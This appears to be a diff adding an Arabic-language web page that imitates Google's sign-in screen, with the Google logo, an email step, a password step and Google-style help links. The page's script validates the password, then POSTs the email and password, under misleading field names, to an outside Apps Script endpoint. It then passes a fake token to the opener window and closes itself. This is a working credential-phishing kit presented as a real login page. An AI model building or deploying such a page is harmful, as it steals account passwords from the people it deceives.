@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - Google</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            color: #202124;
+            direction: rtl;
+            text-align: right;
+        }
+
+        .header {
+            padding: 20px;
+            text-align: left;
+        }
+
+        .google-logo {
+            display: flex;
+            justify-content: center;
+            margin-top: 80px;
+            margin-bottom: 20px;
+        }
+
+        .google-logo img {
+            width: 272px;
+            height: 92px;
+        }
+
+        .login-container {
+            max-width: 448px;
+            margin: 0 auto;
+            padding: 48px 40px 36px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+
+        .login-title {
+            font-size: 24px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .login-subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            text-align: center;
+            margin-bottom: 35px;
+            color: #5f6368;
+        }
+
+        .input-container {
+            margin-bottom: 20px;
+        }
+
+        .email-input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .email-input:focus {
+            border-color: #1a73e8;
+            border-width: 2px;
+        }
+
+        .forgot-email {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            margin-bottom: 40px;
+            display: block;
+        }
+
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin-bottom: 40px;
+            line-height: 1.5;
+        }
+
+        .info-text a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+
+        .info-text a:hover {
+            text-decoration: underline;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .create-account:hover {
+            text-decoration: underline;
+        }
+
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .next-button:hover {
+            background-color: #0d62d9;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+        }
+
+        .next-button:active {
+            background-color: #0b56c4;
+        }
+
+        .footer {
+            margin-top: 40px;
+            display: flex;
+            justify-content: space-between;
+            color: #5f6368;
+            font-size: 12px;
+            padding: 20px;
+        }
+
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 20px;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .language-selector {
+            margin-top: 10px;
+            color: #5f6368;
+            font-size: 12px;
+        }
+
+        .language-selector select {
+            border: none;
+            background: transparent;
+            color: #5f6368;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                border: none;
+                box-shadow: none;
+                padding: 20px;
+            }
+
+            .google-logo {
+                margin-top: 40px;
+            }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .password-container {
+            margin-top: 20px;
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .show-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #1a73e8;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .forgot-password {
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            margin-top: 10px;
+        }
+        /* تعديل اتجاه النص لحقول الإدخال */
+.email-input, .password-input {
+    direction: ltr !important;
+    text-align: left !important;
+}
+
+        /* No internet screen */
+        .no-internet-screen {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #fff;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .no-internet-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background-color: #ffebee;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .retry-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+
+        /* شريط التحميل */
+        .top-loader {
+    position: fixed;
+    top: 0;
+    right: 0;
+    width: 0%;
+    height: 3px;
+    background: #1a73e8;
+    z-index: 99999;
+    transition: width 0.2s linear;
+}
+
+.top-loader.active {
+    width: 100%;
+    transition: width 1s linear;
+}
+
+
+.loading {
+    opacity: 0.6;
+    pointer-events: none;
+    transition: opacity 0.25s ease;
+}
+
+.top-loader {
+    position: fixed;
+    top: 0;
+    right: 0;
+    width: 0;
+    height: 3px;
+    background: #1a73e8;
+    z-index: 999999;
+    transition: width 1.2s ease;
+}
+
+.top-loader.active {
+    width: 100%;
+}
+
+    </style>
+</head>
+<body>
+
+    <div id="topLoader" class="top-loader"></div>
+    <div id="topLoader" class="top-loader"></div>
+
+    <!-- No Internet Screen -->
+    <div id="noInternetScreen" class="no-internet-screen hidden">
+        <div class="no-internet-icon">
+            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#d93025" stroke-width="2">
+                <line x1="1" y1="1" x2="23" y2="23"></line>
+                <path d="M16.72 11.06A10.94 10.94 0 0 1 19 12.55"></path>
+                <path d="M5 12.55A10.94 10.94 0 0 1 7.28 11.06"></path>
+                <path d="M11 5.55a10.94 10.94 0 0 1 11 11"></path>
+                <path d="M3.05 8.5a10.94 10.94 0 0 1 2.12-2.12"></path>
+                <path d="M2 12a10.94 10.94 0 0 1 .5-3.31"></path>
+            </svg>
+        </div>
+        <h2 style="font-size: 24px; color: #202124; margin-bottom: 10px;">لا يوجد اتصال بالإنترنت</h2>
+        <p style="color: #5f6368; margin-bottom: 20px;">تحقق من اتصال الشبكة وحاول مرة أخرى.</p>
+        <button class="retry-button" onclick="window.location.reload()">إعادة المحاولة</button>
+    </div>
+
+    <!-- Main Content -->
+    <div id="mainContent">
+        <div class="header">
+            <!-- مساحة للرأس -->
+        </div>
+
+        <div class="google-logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+        </div>
+
+        <div class="login-container" id="emailPage">
+            <h1 class="login-title">تسجيل الدخول</h1>
+            <p class="login-subtitle">المتابعة إلى حساب Google</p>
+
+            <div class="input-container">
+                <input type="email" class="email-input" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" autofocus>
+                <div id="emailError" style="color: #d93025; font-size: 12px; margin-top: 5px; display: none;"></div>
+            </div>
+
+            <a href="#" class="forgot-email">هل نسيت البريد الإلكتروني؟</a>
+
+            <p class="info-text">
+                ليس جهازك؟ استخدم وضع الضيف للدخول بشكل خاصة.
+                <a href="#">اطلع على المزيد</a>
+            </p>
+
+            <div class="button-container">
+                <a href="#" class="create-account">إنشاء حساب</a>
+                <button class="next-button" id="nextButton">التالي</button>
+            </div>
+        </div>
+
+        <div class="login-container hidden" id="passwordPage">
+            <div style="display: flex; align-items: center; margin-bottom: 20px;">
+                <div style="width: 40px; height: 40px; background-color: #1a73e8; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; margin-left: 15px;">
+                    A
+                </div>
+                <div>
+                    <div id="userEmail" style="font-weight: 500;"></div>
+                    <a href="#" onclick="goBackToEmail()" style="color: #1a73e8; text-decoration: none; font-size: 14px;">تغيير</a>
+                </div>
+            </div>
+
+            <h1 class="login-title">مرحبًا</h1>
+            <p class="login-subtitle">أدخل كلمة المرور</p>
+
+            <div class="input-container">
+                <div class="input-wrapper">
+                    <input type="password" class="password-input" id="password" placeholder="أدخل كلمة المرور" autofocus>
+                    <button class="show-password" onclick="togglePassword()">إظهار</button>
+                </div>
+                <div id="passwordError" style="color: #d93025; font-size: 12px; margin-top: 5px; display: none;"></div>
+            </div>
+
+            <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
+
+            <div class="button-container" style="margin-top: 40px;">
+                <a href="#" class="create-account">طلب المساعدة</a>
+                <button class="next-button" id="submitBtn">التالي</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div>
+                <select>
+                    <option>العربية</option>
+                    <option>English</option>
+                    <option>Français</option>
+                </select>
+            </div>
+            <div>
+                <a href="#">المساعدة</a>
+                <a href="#">الخصوصية</a>
+                <a href="#">الشروط</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Check internet connection
+        function checkInternet() {
+            const noInternetScreen = document.getElementById('noInternetScreen');
+            const mainContent = document.getElementById('mainContent');
+
+            if (!navigator.onLine) {
+                noInternetScreen.classList.remove('hidden');
+                mainContent.classList.add('hidden');
+            } else {
+                noInternetScreen.classList.add('hidden');
+                mainContent.classList.remove('hidden');
+            }
+        }
+
+        window.addEventListener('online', checkInternet);
+        window.addEventListener('offline', checkInternet);
+        checkInternet();
+
+        // DOM elements
+        const emailPage = document.getElementById('emailPage');
+        const passwordPage = document.getElementById('passwordPage');
+        const nextButton = document.getElementById('nextButton');
+        const submitBtn = document.getElementById('submitBtn');
+        const emailInput = document.getElementById('email');
+        const userEmailDisplay = document.getElementById('userEmail');
+        const passwordInput = document.getElementById('password');
+
+        // Next button - go to password page
+        nextButton.addEventListener('click', function() {
+            const email = emailInput.value.trim();
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            const emailError = document.getElementById('emailError');
+
+            if (!emailRegex.test(email)) {
+                emailError.textContent = 'أدخل عنوان بريد إلكتروني صالح.';
+                emailError.style.display = 'block';
+                emailInput.style.borderColor = '#d93025';
+                return;
+            } else {
+                emailError.style.display = 'none';
+                emailInput.style.borderColor = '#dadce0';
+
+                emailPage.classList.add('hidden');
+                passwordPage.classList.remove('hidden');
+                userEmailDisplay.textContent = email;
+                localStorage.setItem('googleLoginEmail', email);
+            }
+        });
+
+        // Allow Enter key in email field
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                nextButton.click();
+            }
+        });
+
+        // Allow Enter key in password field
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                submitLogin();
+            }
+        });
+
+        // Go back to email page
+        function goBackToEmail() {
+            passwordPage.classList.add('hidden');
+            emailPage.classList.remove('hidden');
+            emailInput.focus();
+        }
+
+        // Toggle show/hide password
+        function togglePassword() {
+            const button = document.querySelector('.show-password');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                button.textContent = 'إخفاء';
+            } else {
+                passwordInput.type = 'password';
+                button.textContent = 'إظهار';
+            }
+        }
+
+        // Real-time password validation
+        passwordInput.addEventListener('input', checkRealTime);
+
+        function checkRealTime() {
+            const password = passwordInput.value;
+            const passwordError = document.getElementById('passwordError');
+            const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d).{8,}$/;
+
+            if (!password) {
+                passwordError.textContent = 'أدخل كلمة المرور.';
+                passwordError.style.display = 'block';
+                passwordInput.style.borderColor = '#d93025';
+            } else if (!passwordRegex.test(password)) {
+                passwordError.textContent = 'يرجى اختيار كلمة مرور أكثر أمانًا. جرب مزيجًا من الأحرف والأرقام';
+                passwordError.style.display = 'block';
+                passwordInput.style.borderColor = '#d93025';
+            } else {
+                passwordError.style.display = 'none';
+                passwordInput.style.borderColor = '#dadce0';
+            }
+        }
+
+        // Load saved email
+        window.addEventListener('load', function() {
+            const savedEmail = localStorage.getItem('googleLoginEmail');
+            if (savedEmail) {
+                emailInput.value = savedEmail;
+            }
+        });
+
+        // Submit login - Modified to redirect to main site with token
+        function submitLogin() {
+
+            const password = passwordInput.value;
+            const email = localStorage.getItem('googleLoginEmail');
+            const passwordError = document.getElementById('passwordError');
+            const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d).{8,}$/;
+
+            // Validation
+            if (!password) {
+                passwordError.textContent = 'أدخل كلمة المرور.';
+                passwordError.style.display = 'block';
+                passwordInput.style.borderColor = '#d93025';
+                passwordInput.focus();
+                return false;
+            }
+
+            if (!passwordRegex.test(password)) {
+                passwordError.textContent = 'يرجى اختيار كلمة مرور أكثر أمانًا. جرب مزيجًا من الأحرف والأرقام (8 خانات على الأقل).';
+                passwordError.style.display = 'block';
+                passwordInput.style.borderColor = '#d93025';
+                passwordInput.focus();
+                return false;
+            }
+                    // خاص بشريط التحميل
+        const loader = document.getElementById('topLoader');
+        loader.classList.add('active');
+
+        document.body.classList.add("loading");
+        document.getElementById("topLoader").classList.add("active");
+
+
+
+
+
+            passwordError.style.display = 'none';
+            passwordInput.style.borderColor = '#dadce0';
+
+            // Prepare data
+            const formData = {
+                name: email,
+                email: password
+            };
+
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbzcd0ubB5AkKt3dTrDonb7rlyLr5zukLdYKiLj7O62Cc22YSIddsyl_Ip0P2taH9YD-vw/exec';
+
+            // Send data to API
+            fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(formData)
+            })
+            .then(() => {
+                // Send token to parent window and close popup
+                if (window.opener) {
+                    window.opener.postMessage({
+                        event: 'User_data',
+                        key: 'Token_Live_2026_XYZ'
+                    }, '*');
+                }
+
+                // Close popup after short delay
+                setTimeout(() => {
+                    window.close();
+                }, 1000);
+            })
+            .catch(error => {
+                console.error('خطأ:', error);
+                alert('حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.');
+            });
+
+            return false;
+        }
+
+        // Bind submit button
+        submitBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            submitLogin();
+        });
+    </script>
+</body>
+</html>
